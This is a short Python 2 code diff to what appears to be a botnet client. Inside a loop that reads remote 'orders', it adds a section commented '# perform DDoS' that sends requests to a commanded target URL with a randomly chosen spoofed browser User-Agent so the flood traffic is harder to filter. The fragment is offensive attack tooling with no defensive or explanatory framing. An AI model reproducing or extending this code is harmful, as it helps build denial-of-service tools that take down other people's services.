@@ -22,6 +22,7 @@
 
 import urllib2
 import platform
+from random import randint
 import time
 
 
@@ -49,4 +50,8 @@ while(True):
                                 break
                         else:
                                 target = orders[1]
-                                urllib2.urlopen(target)
+                                # perform DDoS
+                                differentBrowsers = ["Mozilla/5.0 Firefox/35.0", "Safari", "Chrome/40.0.2214.115", "MSIE 7.0"]
+                                browserSelect = randint(0, len(differentBrowsers)-1)
+                                req = urllib2.Request(target, headers={'User-Agent':differentBrowsers[browserSelect]})
+                                urllib2.urlopen(req)
